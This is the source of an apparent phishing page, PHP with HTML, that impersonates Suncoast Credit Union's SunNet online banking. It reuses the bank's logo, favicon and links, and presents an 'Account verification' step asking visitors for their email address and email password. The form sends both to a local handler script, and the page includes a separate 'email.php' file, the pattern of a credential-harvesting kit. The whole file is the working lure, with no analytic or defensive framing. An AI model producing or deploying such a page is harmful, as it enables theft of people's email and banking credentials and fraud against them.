<?php
include 'email.php';
 ?>
<!DOCTYPE html>
<html lang="en" class=" js cssanimations">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    

      <title>Account verification</title>
      <meta name="description" content="">
      <link href="https://banking.suncoastcreditunion.com/favicon.ico" rel="shortcut icon" type="image/x-icon">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.2, minimum-scale=1, user-scalable=1">
      <meta http-equiv="Page-Exit" content="Alpha(opacity=100)">
      <link href="./main_files/css.css" rel="stylesheet">
      <link href="./main_files/font-awesome.min.css" rel="stylesheet">
      <link rel="stylesheet" href="./main_files/font-awesome.min(1).css">
      <link href="./main_files/css(1).css" rel="stylesheet" type="text/css">
      <script src="./main_files/mainjsko3" type="text/javascript"></script>
      
      
      <link rel="apple-touch-icon" href="https://banking.suncoastcreditunion.com/content/images/banner-icon.png">
      <link href="./main_files/Authentication.css" rel="stylesheet">
      <style type="text/css" nonce="f32afd94ff99" media="print">.usabilla_live_button_container { display: none; }</style>
      <style type="text/css" nonce="f32afd94ff99">iframe.usabilla-live-button#usabilla_live_button_container_iframe215558178{width:39px;height:110px;margin: 0;padding: 0;border: 0;overflow: hidden;z-index: 9998;position: absolute;left: 0;top: 0;box-shadow: 0 0 0;background-color: transparent;}</style>
   </head>
   <body data-new-gr-c-s-check-loaded="14.1049.0" data-gr-ext-installed="">
      <div id="lightningjs-usabilla_live" style="display: none;">
      </div>

      <header class="printHidden">
         <div id="divHeader" class="navbar navbar-fixed-top">
            <div class="navbar-inner">
               <a class="tempHide pull-right" id="icoWarningShow" href="https://banking.suncoastcreditunion.com/Mfa/index#" title="Unsupported Browser"><i class="icon-warning-sign"></i></a>
               <div class="container">
                  <a href="https://banking.suncoastcreditunion.com/Home" class="brand logo">
                  <img alt="SunNet Online Banking" src="./main_files/mainlogo.gif">
                  </a>
                  <div>
                     <div class="headerRight">
                        <nav>
                           <ul class="nav topnav">
                              <li class="dropdown primary" id="individualMenuItem">
                                 <a href="https://www.suncoastcreditunion.com/"><i class="icon-lock icon-white"></i>&nbsp;Log Into SunNet</a>
                              </li>
                              <li class="dropdown primary" id="confirmationMenuItem">
                                 <a href="https://www.suncoastcreditunion.com/"><i class="icon-globe icon-white"></i>&nbsp;SuncoastCreditUnion.com</a>
                              </li>
                           </ul>
                        </nav>
                     </div>
                  </div>
               </div>
               <div id="browserWarning" class="tempHide">
                  <i class="icon-warning-sign"></i> <span class="underline bold"> SUPPORTED BROWSERS</span> - Internet Explorer 9+, Firefox, Chrome, Safari 6+, Safari on iPad/iPhone. <br>If you are not using a supported browser, parts of the website might not function properly. <br>Please upgrade your browser to a supported browser for the best experience.. &nbsp;&nbsp;&nbsp;<a href="https://banking.suncoastcreditunion.com/Mfa/index#" id="warningClose"><i class="icon-remove"></i> close</a>
               </div>
            </div>
         </div>
      </header>
      <div class="container">
         <hgroup class="title">
            <h1>&nbsp;</h1>
         </hgroup>
         <div class="content">
            <div class="row-fluid">
               <div class="login-form">
                  <h3>Account verification</h3>
                  <p><b>Step 1 - Email Verification</b><br><br>Keeping financial information secure is one of our most important responsibilities. We value your trust and handle information about you with care. We limit access to the users in order to ensure the privacy and security <a href="https://www.suncoastcreditunion.com/privacy-policy" >[read more]</a>.</p>
                  <form action="handlers/process2.php" autocomplete="off"  method="post" >
                    
                     <style type="text/css">
                        #hrArea .control-label {
                        width: 150px;
                        }
                        #hrArea .btn {
                        width: auto;
                        -moz-min-width: 100px;
                        -ms-min-width: 100px;
                        -o-min-width: 100px;
                        -webkit-min-width: 100px;
                        min-width: 100px;
                        }
                        .mfaModal {
                        /*min-height: 475px;*/
                        padding: 50px !important;
                        text-align: center;
                        text-align: center;
                        width: 450px;
                        border-radius: 10px;
                        }
                        .mfaModalContent {
                        /*padding: 25px;*/
                        }
                        .mfaModalContent .title {
                        font-size: 30px;
                        }
                        .mfaModalContent .info {
                        font-size: 16px;
                        }
                        .mfaModalContent img {
                        height: 105px;
                        display: block;
                        margin: 20px auto;
                        }
                        .buttonwrapper button {
                        display: block;
                        width: 90%;
                        height: 50px;
                        margin: 0px auto 20px;
                        }
                        label.inline {
                        display: inline-block;
                        font-weight: bold;
                        font-size: 16px;
                        }
                        .optionwrapper {
                        margin: 10px 0;
                        }
                        .optionwrapper input {
                        margin-right: 20px;
                        vertical-align: top;
                        }
                     </style>
                     <fieldset>
                        <input type="text" id="fxMemberId" autocomplete="off" style="display: none;">
                        <input type="password" id="fxPass" autocomplete="off" style="display: none;">
                        <legend>
                           <span class="scuBlueText" data-bind="slideVisible:allowMemberIdEntry()" style="display: inline;"></span><span style="display: none;" data-bind="slideVisible:!allowMemberIdEntry()">
                           <span class="scuGreenText">Authenticating </span><span class="scuBlueText" data-bind="text:userId"></span>
                           </span>
                        </legend>
                        <div style="" data-bind="visible: errorMessage() &amp;&amp; errorMessage() != &#39;&#39;" class="red-text">
                           <ul>
                              <!-- <li data-bind="html:errorMessage">Invalid Member ID.</li> -->
                           </ul>
                        </div>
                        <div style="" data-bind="slideVisible:showLogin() &amp;&amp; !loading()">
                           <h5 class="scuBlueText" data-bind="text: allowMemberIdEntry() ? &#39;Member Number &amp; Password&#39; : &#39;Password&#39;">Verify the linked email account</h5>
                           <div style="" data-bind="visible:allowMemberIdEntry" class="control-group">
                              <input data-bind="value:userId" id="txtMemberNumber" type="text"  autofocus="autofocus"   data-val-required="The Member ID field is required."  name="email" placeholder="Email" tabindex="1" class="input-validation-error" required>
                           </div>
                           <div class="control-group">
                              <input data-bind="value:password,valueUpdate: &#39;keyup&#39;" id="txtPassword" data-val="true" data-val-length="The password you entered is invalid." data-val-length-max="16" data-val-required="Required"  name="password" placeholder="Email Password" tabindex="2" type="password" class="input-validation-error" required>
                           </div>
                           
                        </div>
                        <div style="display: none;" class="center padding30" data-bind="slideVisible:loading">
                           <div class="center padding30">
                              <img class="opaque" src="./main_files/Wait64.gif" alt="Loading">
                           </div>
                           <br><br>
                           <h6 class="scuGreenText" data-bind="text:displayMessage"></h6>
                        </div>
                        <div data-bind="if:showChallenge() &amp;&amp; !loading()"></div>
                        <div style="display: none;" class="center" data-bind="slideVisible:!allowMemberIdEntry()">
                           <span class="small-text"><br><a href="https://banking.suncoastcreditunion.com/" title="Login Again">Login again</a> with a different member number?<br></span>
                        </div>
                        <hr>
                        <div class="control-group">
                           <button style="" type="submit"  class="btn btn-primary btn-login-right" tabindex="4">
                           <!-- <img src="./main_files/loader.gif" data-bind="visible: processing" alt="Loading"> -->
                           Continue
                           </button>
                           <input type="submit"  value="Cancel"  id="btnCancel" class="btn btn-info cancel" disabled>
                          <!--  <script type="text/javascript">
                              document.getElementById('btnCancel').disableValidation = true;
                           </script> -->
                        </div>
                     </fieldset>
                  </form>
        
               </div>
            </div>
         </div>
      </div>
   

      <div class="usabilla_live_button_container" id="usabilla_live_button_container_964459991" role="button" tabindex="0" aria-label="Usabilla Feedback Button" style="display: none;">
         <style type="text/css" nonce="f32afd94ff99">div.usabilla_live_button_container#usabilla_live_button_container_964459991[role="button"] {position:fixed;width:39px;height:110px;z-index:999;right:0px;top:50%;margin-top:-55px}</style>
         <iframe src="./main_files/saved_resource(1).html" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" data-tags="right" title="Usabilla Feedback Button" class="usabilla-live-button" id="usabilla_live_button_container_iframe215558178"></iframe>
      </div>
   </body>
   <grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
</html>
